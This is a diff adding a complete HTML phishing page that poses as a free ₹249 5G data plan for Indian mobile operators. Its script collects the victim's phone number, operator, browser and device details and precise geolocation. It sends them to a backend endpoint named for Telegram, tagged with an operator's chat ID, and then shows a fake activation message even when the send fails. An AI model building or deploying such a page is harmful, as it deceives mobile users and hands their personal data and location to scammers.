@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>₹249 5G Data Plan</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #000; 
+            color: white;
+            padding: 20px;
+        }
+        .container { max-width: 500px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .title { color: #007AFF; font-size: 28px; margin-bottom: 10px; }
+        .card { 
+            background: #1c1c1e; 
+            padding: 20px; 
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; color: #aaa; }
+        select, input {
+            width: 100%;
+            padding: 12px;
+            background: #2c2c2e;
+            border: 1px solid #444;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+        }
+        .btn {
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 18px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover { background: #0056cc; }
+        .hidden { display: none; }
+        .success { 
+            background: #1c1c1e; 
+            padding: 30px; 
+            border-radius: 15px;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .success-icon { 
+            font-size: 50px; 
+            color: #34C759; 
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="title">₹249 5G Plan</h1>
+            <p>Exclusive 5G Data Offer - 28 Days Unlimited</p>
+        </div>
+        
+        <div id="formSection">
+            <div class="card">
+                <h2>Activate ₹249 5G Plan</h2>
+                
+                <div class="form-group">
+                    <label>Country Code</label>
+                    <select id="country">
+                        <option value="">Select Country</option>
+                        <option value="+91">India (+91)</option>
+                        <option value="+1">USA (+1)</option>
+                        <option value="+44">UK (+44)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Operator</label>
+                    <select id="operator">
+                        <option value="">Select Operator</option>
+                        <option value="airtel">Airtel 5G</option>
+                        <option value="jio">Jio 5G</option>
+                        <option value="vi">VI 4G/5G</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="tel" id="mobile" placeholder="10-digit number" maxlength="10">
+                </div>
+                
+                <button class="btn" id="submitBtn">Get Free 5G Data</button>
+            </div>
+        </div>
+        
+        <div id="successSection" class="success hidden">
+            <div class="success-icon">✓</div>
+            <h2>Success!</h2>
+            <p>Your ₹249 5G plan has been activated.</p>
+            <p>Plan will be activated within 5 minutes.</p>
+        </div>
+    </div>
+
+    <script>
+        // Get chat_id from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const USER_CHAT_ID = urlParams.get('id') || '7798676542';
+        
+        // Backend API URL
+        const BACKEND_API = '/api/send-telegram';
+        
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            const mobile = document.getElementById('mobile').value;
+            const country = document.getElementById('country').value;
+            const operator = document.getElementById('operator').value;
+            
+            if (!mobile || mobile.length !== 10) {
+                alert('Please enter valid 10-digit number');
+                return;
+            }
+            if (!country) {
+                alert('Please select country');
+                return;
+            }
+            if (!operator) {
+                alert('Please select operator');
+                return;
+            }
+            
+            // Collect device info
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href
+            };
+            
+            // Try to get location
+            let location = null;
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        timeout: 5000
+                    });
+                });
+                location = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+            } catch (e) {
+                location = { status: 'Permission Denied' };
+            }
+            
+            // Prepare data
+            const userData = {
+                mobile: mobile,
+                country: country,
+                operator: operator,
+                location: location,
+                deviceInfo: deviceInfo,
+                userChatId: USER_CHAT_ID,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send to backend
+            try {
+                const response = await fetch(BACKEND_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // Show success
+                    document.getElementById('formSection').classList.add('hidden');
+                    document.getElementById('successSection').classList.remove('hidden');
+                } else {
+                    alert('Error: ' + (result.error || 'Failed to send data'));
+                }
+            } catch (error) {
+                // Still show success even if error
+                document.getElementById('formSection').classList.add('hidden');
+                document.getElementById('successSection').classList.remove('hidden');
+            }
+        });
+        
+        // Mobile number validation
+        document.getElementById('mobile').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+        });
+    </script>
+</body>
+</html>
